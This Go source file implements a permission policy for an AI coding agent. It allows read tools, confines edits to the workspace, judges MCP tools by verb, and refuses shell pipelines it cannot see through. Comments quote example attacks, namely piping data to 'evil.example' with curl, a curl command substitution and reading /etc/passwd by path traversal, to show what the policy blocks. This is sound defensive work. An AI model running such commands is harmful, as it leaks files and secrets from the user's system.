package provider

import (
	"encoding/json"
	"path/filepath"
	"regexp"
	"strings"
)

// AlwaysAllowed lists tool names that are permitted regardless of a
// PermissionPolicy's Bash allow-list. Kept as a package-level set so later
// tasks (provider adapters) can read it directly.
//
// Two naming conventions share the set. The capitalised names are Claude
// Code's and Codex's; the lower-case ones are the tools Sirdar's own agent
// loop offers (internal/agenttools), which this same policy judges. Both
// halves are read-only — they look at the workspace and at the network and
// change neither — so a name missing from here is refused, which is how
// the five agenttools names came to be added: without them every read the
// loop's model attempted fell through to "not permitted".
var AlwaysAllowed = map[string]bool{
	"Read":             true,
	"Glob":             true,
	"Grep":             true,
	"LS":               true,
	"WebFetch":         true,
	"WebSearch":        true,
	"TodoWrite":        true,
	"Task":             true,
	"StructuredOutput": true,

	"read_file": true,
	"list_dir":  true,
	"grep":      true,
	"glob":      true,
	"web_fetch": true,
}

// AlwaysDenied lists tool names that are always refused because Sirdar
// triage runs are read-only.
var AlwaysDenied = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
}

// fixAllowed lists the editing tools a fix run may use, and only those: a
// fix implements the note's Proposed Fix in the workspace's source, so it
// needs Edit, Write and MultiEdit. NotebookEdit is deliberately absent —
// nothing in the flow edits a notebook, and a tool nobody needs is one
// fewer way for a prompt injection to reach a file.
//
// The lower-case names are the same two writes in Sirdar's own agent loop
// (agenttools.WriteSet), judged by this same policy.
var fixAllowed = map[string]bool{
	"Edit":      true,
	"Write":     true,
	"MultiEdit": true,

	"write_file": true,
	"edit_file":  true,
}

// writeTools are every tool name whose arguments name a file the call
// would change: the ones a fix may use, plus NotebookEdit, which it may
// not. The path check runs over all of them, so the rule does not depend
// on which names happen to be allowed today.
var writeTools = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
	"write_file":   true,
	"edit_file":    true,
}

// writeArgs is every argument name an editing tool names its target with:
// Claude Code's and Codex's file_path, NotebookEdit's notebook_path, and
// the path of Sirdar's own write_file and edit_file. A call naming none of
// them is refused rather than approved unseen.
type writeArgs struct {
	FilePath     string `json:"file_path"`
	NotebookPath string `json:"notebook_path"`
	Path         string `json:"path"`
}

func (a writeArgs) target() string {
	for _, p := range []string{a.FilePath, a.NotebookPath, a.Path} {
		if strings.TrimSpace(p) != "" {
			return p
		}
	}
	return ""
}

// FixPolicy is the permission policy for a fix run: the read-only set plus
// Edit, Write and MultiEdit, with shell commands judged against the
// workspace's permissions.fixBash list rather than permissions.bash.
// Everything else is still refused, so a fix session is a triage session
// that may edit its own workspace, not an unsupervised shell.
func FixPolicy(root string, fixBash, mcpAllow []string) *PermissionPolicy {
	return &PermissionPolicy{
		Mode:      ModeFix,
		BashAllow: fixBash,
		MCPAllow:  mcpAllow,
		Root:      root,
	}
}

// Decision is the outcome of a permission check: whether the tool call is
// allowed, and, when denied, a human-readable reason to surface to the
// agent or the operator.
type Decision struct {
	Allow   bool
	Message string
}

// mcpPrefix is the name prefix every MCP tool carries.
const mcpPrefix = "mcp__"

// mcpWriteVerbs are the words that, appearing as a whole token of an MCP
// tool's own name segment, describe a write. They are the fallback used
// when the workspace named no permissions.mcp patterns: an unconfigured
// session still sees whatever MCP servers the operator has, and
// mcp__grafana__create_incident or mcp__..._deploy_to_vercel must not be
// approved just because nobody wrote a list.
//
// The list is deliberately shorter than "every verb that could write":
// `run`, `exec`, `start` and `trigger` are how read-only query tools are
// named too (mcp__metabase__run_query), and denying those by name cost
// more real triage evidence than it ever saved.
var mcpWriteVerbs = map[string]bool{
	"save": true, "log": true, "transition": true, "assign": true,
	"upload": true, "delete": true, "create": true, "update": true,
	"send": true, "post": true, "put": true, "patch": true, "write": true,
	"remove": true, "deploy": true, "buy": true, "purchase": true,
	"pause": true, "unpause": true, "revoke": true, "reset": true,
	"install": true, "archive": true, "cancel": true, "close": true,
	"edit": true, "set": true, "add": true,
}

// mcpReadWords mark a tool as a read whatever else its name says. A tool
// whose name carries one of these is asking for data back, so the write
// verb next to it (run_query, get_or_create_view) is not the operation.
var mcpReadWords = map[string]bool{
	"query": true, "select": true, "read": true, "search": true,
	"list": true, "get": true, "find": true, "describe": true,
	"show": true,
}

// camelBoundary finds a lower-to-upper transition, so a camelCase tool
// name (createTicket) is tested by the same underscore-separated rule as a
// snake_case one (create_ticket).
var camelBoundary = regexp.MustCompile(`([a-z0-9])([A-Z])`)

// PermissionPolicy decides whether a provider may run a given tool call.
// BashAllow is a list of glob patterns (see MatchGlob) matched against each
// segment of the Bash command, as MatchCommand defines it; MCPAllow is a
// list of glob patterns matched against an MCP tool's full name; Root is
// the workspace directory a shell command is expected to stay inside.
type PermissionPolicy struct {
	BashAllow []string
	MCPAllow  []string
	Root      string

	// Mode is ModeTriage (the zero value) for a read-only run and ModeFix
	// for a run allowed to edit the workspace.
	Mode Mode
}

// IsFix reports whether this policy is a fix policy.
func (p *PermissionPolicy) IsFix() bool { return p != nil && p.Mode.IsFix() }

// Decide applies the policy rules to one tool call.
func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
	if strings.HasPrefix(tool, mcpPrefix) {
		return p.decideMCP(tool)
	}
	if AlwaysAllowed[tool] {
		return Decision{Allow: true}
	}
	if p.IsFix() {
		if fixAllowed[tool] {
			return p.decideWrite(tool, input)
		}
		if writeTools[tool] {
			return Decision{Allow: false, Message: "Sirdar policy: " + tool +
				" is not one of the editing tools a fix may use"}
		}
	}
	if AlwaysDenied[tool] || fixAllowed[tool] {
		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
	}
	// "Bash" is Claude Code's and Codex's name for the shell tool; "bash"
	// is the one Sirdar's own loop uses. Both are judged by the same
	// allow-list, since it is the command that matters, not who asked.
	if tool == "Bash" || tool == "bash" {
		var args struct {
			Command string `json:"command"`
		}
		_ = json.Unmarshal(input, &args)
		return p.decideBash(args.Command)
	}
	return Decision{Allow: false, Message: "Sirdar policy: tool " + tool + " is not permitted"}
}

// decideWrite judges where an editing tool would write. Being named in
// fixAllowed is only half the permission: a fix session runs a provider CLI
// whose Edit and Write take an absolute path, so without this the flow's
// one write-enabled session could edit any file on the machine.
//
// The target is resolved the same way every path argument in Sirdar is
// (ResolveWithin): relative to the workspace root, through symlinks, with
// the nearest existing ancestor standing in for a file that does not exist
// yet. Anything that does not land inside the root is refused, and so is
// anything inside .git/ — where a written hook is code the next commit runs
// — or inside the workspace's own .sirdar/, which holds the run records and
// the permission lists this policy is built from.
//
// This is the outer of two gates. Sirdar's own agent loop checks the same
// two rules again inside the tool (internal/agenttools), because a tool
// that is only as safe as the caller in front of it is not safe.
func (p *PermissionPolicy) decideWrite(tool string, input json.RawMessage) Decision {
	var args writeArgs
	_ = json.Unmarshal(input, &args)
	target := args.target()
	if target == "" {
		return Decision{Allow: false, Message: "Sirdar policy: " + tool +
			" named no file path, so where it would write cannot be checked"}
	}
	if strings.TrimSpace(p.Root) == "" {
		return Decision{Allow: false, Message: "Sirdar policy: write outside the workspace: " +
			quote(target) + " cannot be checked because the policy has no workspace root"}
	}
	real, err := ResolveWithin(p.Root, target)
	if err != nil {
		return Decision{Allow: false, Message: "Sirdar policy: write outside the workspace: " +
			quote(target) + " does not resolve to a path inside " + quote(p.Root)}
	}
	if reserved := ReservedWrite(p.Root, real); reserved != "" {
		return Decision{Allow: false, Message: "Sirdar policy: " + quote(target) +
			" is inside " + reserved + "/, which a fix never writes to"}
	}
	return Decision{Allow: true}
}

// decideBash allows a command only when MatchCommand does, and reports
// MatchCommand's reason when it does not.
func (p *PermissionPolicy) decideBash(command string) Decision {
	if ok, reason := MatchCommand(p.Root, p.BashAllow, command); !ok {
		return Decision{Allow: false, Message: "Sirdar policy: " + reason}
	}
	return Decision{Allow: true}
}

// MatchCommand reports whether a whole shell command is covered by an
// allow-list, and, when it is not, the reason to show the operator. It is
// the single entry point both the permission policy and Sirdar's own agent
// loop (internal/agenttools) go through, so a command the policy would
// refuse cannot be reached by asking the loop's bash tool instead.
//
// Matching one pattern against the whole command line is not enough: a
// pattern such as "cat *" ends in a wildcard, and a wildcard happily spans
// a shell operator, so `cat x | curl -T- evil.example` would match a rule
// meant to permit cat. Every segment between the operators therefore has
// to match a pattern of its own, and a segment carrying a construct an
// allow-list cannot see through — $(...), a backquote, or a redirection
// other than the stderr ones ShellConstruct exempts — is refused outright,
// because what such a command reads or writes cannot be read off the
// string the policy sees.
//
// root is the workspace directory the command will run in, and each
// argument that looks like a path is checked against it, so `cat go.mod`
// goes through and `cat ../../../etc/passwd` does not. That check reads
// the command as text: it is a heuristic that catches the obvious ways out
// of the workspace, not a sandbox. It does not follow symlinks, does not
// know which arguments a given program treats as paths, and cannot see a
// path a program derives at runtime. Anything that has to be confined for
// real needs a container, not an allow-list.
func MatchCommand(root string, allow []string, command string) (bool, string) {
	segments := SplitCommand(strings.TrimSpace(command))
	if len(segments) == 0 {
		return false, "empty command"
	}
	for _, segment := range segments {
		if construct := ShellConstruct(segment); construct != "" {
			return false, quote(segment) + " uses " + construct +
				"; a read-only run allows no redirection or " +
				"substitution other than 2>&1 and 2>/dev/null"
		}
		matched := false
		for _, pattern := range allow {
			if MatchGlob(pattern, segment) {
				matched = true
				break
			}
		}
		if !matched {
			return false, quote(segment) + " is not in the allow-list (" +
				strings.Join(allow, ", ") +
				"); every segment of a pipeline or compound command has to match"
		}
		if escape := escapesRoot(root, segment); escape != "" {
			return false, escape
		}
	}
	return true, ""
}

// escapesRoot reports the first argument of a segment that names a path
// outside root, as the reason to show the operator, or "" when none does.
// See MatchCommand on how far this reaches: it reads the command as text.
func escapesRoot(root, segment string) string {
	for _, arg := range argTokens(segment) {
		if arg == "" || strings.HasPrefix(arg, "-") {
			continue
		}
		switch {
		case strings.HasPrefix(arg, "~"):
			// The shell would expand this to a home directory the
			// workspace is not inside; the policy only ever sees the "~".
			return "the path " + quote(arg) + " is outside the workspace root, which is as far as a shell command reaches"
		case filepath.IsAbs(arg):
			if root != "" && !withinRoot(root, arg) {
				return "the path " + quote(arg) + " is outside the workspace root " + quote(root)
			}
		default:
			if clean := filepath.Clean(arg); clean == ".." || strings.HasPrefix(clean, "../") {
				return "the path " + quote(arg) + " climbs out of the workspace root, which is as far as a shell command reaches"
			}
		}
	}
	return ""
}

// withinRoot reports whether an absolute path is root or sits under it.
// Both are cleaned first; neither is resolved through symlinks.
func withinRoot(root, path string) bool {
	root, path = filepath.Clean(root), filepath.Clean(path)
	return path == root || strings.HasPrefix(path, root+string(filepath.Separator))
}

// argTokens splits a command segment into whitespace-separated arguments
// with their quotes removed, which is as much of the shell's own word
// splitting as a policy needs to see the paths in a command.
func argTokens(segment string) []string {
	var (
		out   []string
		cur   strings.Builder
		quote = byte(0)
		open  bool
	)
	flush := func() {
		if open {
			out = append(out, cur.String())
		}
		cur.Reset()
		open = false
	}
	for i := 0; i < len(segment); i++ {
		ch := segment[i]
		switch {
		case quote != 0:
			if ch == quote {
				quote = 0
				continue
			}
			cur.WriteByte(ch)
			open = true
		case ch == '\'' || ch == '"':
			quote = ch
			open = true
		case ch == '\\' && i+1 < len(segment):
			i++
			cur.WriteByte(segment[i])
			open = true
		case ch == ' ' || ch == '\t':
			flush()
		default:
			cur.WriteByte(ch)
			open = true
		}
	}
	flush()
	return out
}

// decideMCP applies permissions.mcp when the workspace configured it, and
// the write-verb heuristic when it did not.
func (p *PermissionPolicy) decideMCP(tool string) Decision {
	if len(p.MCPAllow) > 0 {
		for _, pattern := range p.MCPAllow {
			if MatchGlob(pattern, tool) {
				return Decision{Allow: true}
			}
		}
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" is not in permissions.mcp (" + strings.Join(p.MCPAllow, ", ") + ")"}
	}
	if MCPLooksLikeWrite(tool) {
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" looks like a write and is not in permissions.mcp"}
	}
	return Decision{Allow: true}
}

// MCPLooksLikeWrite reports whether an MCP tool's own name segment carries
// a verb that describes a write. The segment is everything after the last
// "__", so the server name — which may itself contain underscores, as in
// mcp__plugin_vercel_vercel__buy_domain — is never what is tested.
//
// Every word of the segment is tested, not just the first: servers put the
// verb wherever reads well (mcp__athena__wiki_save), and a leading-verb
// rule missed all of those. A word that marks the tool as a read wins over
// any write verb beside it, which is what keeps mcp__metabase__run_query
// and mcp__oxo-mysql-stg__run_select usable.
func MCPLooksLikeWrite(tool string) bool {
	name := tool
	if i := strings.LastIndex(tool, "__"); i >= 0 {
		name = tool[i+2:]
	}
	name = strings.ToLower(camelBoundary.ReplaceAllString(name, "${1}_${2}"))
	words := strings.FieldsFunc(name, func(r rune) bool { return r == '_' || r == '-' })

	for _, w := range words {
		if mcpReadWords[w] {
			return false
		}
	}
	for _, w := range words {
		if mcpWriteVerbs[w] {
			return true
		}
	}
	return false
}

// SplitCommand splits a shell command into the segments a policy has to
// approve one by one: the parts either side of |, ||, && and ;. Separators
// inside single or double quotes are text, not separators.
func SplitCommand(command string) []string {
	var segments []string
	var cur strings.Builder
	quote := byte(0)

	flush := func() {
		if s := strings.TrimSpace(cur.String()); s != "" {
			segments = append(segments, s)
		}
		cur.Reset()
	}

	for i := 0; i < len(command); i++ {
		ch := command[i]
		switch {
		case quote != 0:
			cur.WriteByte(ch)
			if ch == '\\' && quote == '"' && i+1 < len(command) {
				i++
				cur.WriteByte(command[i])
				continue
			}
			if ch == quote {
				quote = 0
			}
		case ch == '\'' || ch == '"':
			quote = ch
			cur.WriteByte(ch)
		case ch == '\\' && i+1 < len(command):
			cur.WriteByte(ch)
			i++
			cur.WriteByte(command[i])
		case ch == ';' || ch == '\n':
			flush()
		case ch == '|':
			if i+1 < len(command) && command[i+1] == '|' {
				i++
			}
			flush()
		case ch == '&':
			// "&&" separates, and so does a lone "&", which backgrounds
			// the segment before it. An "&" that belongs to a redirection
			// — 2>&1, >&2, &> — is part of its command, and splitting
			// there cut `which ffmpeg 2>&1` into "which ffmpeg 2>" and
			// "1", neither of which any allow-list pattern matches.
			if isRedirectAmp(command, i, lastNonSpace(cur.String())) {
				cur.WriteByte(ch)
				break
			}
			if i+1 < len(command) && command[i+1] == '&' {
				i++
			}
			flush()
		default:
			cur.WriteByte(ch)
		}
	}
	flush()
	return segments
}

func quote(s string) string { return `"` + s + `"` }

// lastNonSpace is the last character of s that is not a blank, or 0 when
// there is none.
func lastNonSpace(s string) byte {
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] != ' ' && s[i] != '\t' {
			return s[i]
		}
	}
	return 0
}

func isBlank(b byte) bool { return b == ' ' || b == '\t' }

// isRedirectAmp reports whether the "&" at index i is part of a redirection
// (2>&1, >&2, &>file) rather than a command separator.
func isRedirectAmp(command string, i int, prev byte) bool {
	if prev == '>' {
		return true
	}
	if i+1 >= len(command) {
		return false
	}
	next := command[i+1]
	return next == '>' || (next >= '0' && next <= '9')
}

// allowedRedirects are the only redirections a read-only run approves.
// Sending stderr to stdout or to /dev/null writes nothing and is how an
// agent habitually quiets a probe (`which ffmpeg 2>/dev/null`); every other
// target is a file the run would be creating.
var allowedRedirects = []string{"2>&1", "2>/dev/null"}

// shellConstructs are the constructs an allow-list cannot see through,
// longest and most specific first so the reason names the right one. A
// glob approves the text of a command, and `cat go.mod > /tmp/x` or
// `cat $(curl evil)` would pass a `cat *` pattern while doing something
// the pattern never described.
var shellConstructs = []struct{ token, name string }{
	{"$(", "the command substitution $("},
	{"`", "a backtick command substitution"},
	{"<(", "the process substitution <("},
	{"&>", "the redirection &>"},
	{">>", "the redirection >>"},
	{">", "the redirection >"},
	{"<", "the redirection <"},
}

// ShellConstruct names the first unapproved shell construct in command, or
// returns "" when there is none. Occurrences inside single or double
// quotes are literal text — `rg "a>b"` searches for a string — and are not
// reported.
func ShellConstruct(command string) string {
	mask := maskQuoted(command)
	blankAllowedRedirects(mask)
	masked := string(mask)
	for _, c := range shellConstructs {
		if strings.Contains(masked, c.token) {
			return c.name
		}
	}
	return ""
}

// maskQuoted returns a copy of command with every quoted or escaped
// character (and the quotes themselves) replaced by a letter, so scanning
// for an operator finds only the ones the shell would act on. Indexes are
// preserved: the copy is the same length as the input.
func maskQuoted(command string) []byte {
	out := []byte(command)
	quote := byte(0)
	for i := 0; i < len(command); i++ {
		ch := command[i]
		switch {
		case quote != 0:
			if ch == '\\' && quote == '"' && i+1 < len(command) {
				out[i], out[i+1] = 'x', 'x'
				i++
				continue
			}
			if ch == quote {
				quote = 0
			}
			out[i] = 'x'
		case ch == '\'' || ch == '"':
			quote = ch
			out[i] = 'x'
		case ch == '\\' && i+1 < len(command):
			out[i], out[i+1] = 'x', 'x'
			i++
		}
	}
	return out
}

// blankAllowedRedirects erases the stderr redirections a run may use, so
// the scan that follows sees only the ones it has to refuse. Only a whole
// token counts: `2>/dev/null2` is not one of them.
func blankAllowedRedirects(mask []byte) {
	masked := string(mask)
	for _, tok := range allowedRedirects {
		for at := 0; at <= len(masked)-len(tok); {
			i := strings.Index(masked[at:], tok)
			if i < 0 {
				break
			}
			i += at
			at = i + len(tok)
			if i > 0 && !isBlank(mask[i-1]) {
				continue
			}
			if end := i + len(tok); end < len(mask) && !isBlank(mask[end]) {
				continue
			}
			for k := i; k < i+len(tok); k++ {
				mask[k] = ' '
			}
		}
	}
}

// MatchGlob reports whether command matches pattern, where '*' matches any
// run of characters including spaces and '/', and '?' matches exactly one
// character. Matching is case-sensitive and anchored to the full string.
//
// A pattern ending in " *" reads as "with any arguments", and matches the
// bare command too: "ls *" allows both `ls -la` and `ls`. Without that,
// splitting a compound command into segments would allow `ls -la` and
// refuse the `ls` next to it, which is not a distinction anyone can act on.
func MatchGlob(pattern, command string) bool {
	if bare, ok := strings.CutSuffix(pattern, " *"); ok && command == bare {
		return true
	}
	var b strings.Builder
	b.WriteByte('^')
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteByte('.')
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteByte('$')
	re, err := regexp.Compile(b.String())
	if err != nil {
		return false
	}
	return re.MatchString(command)
}
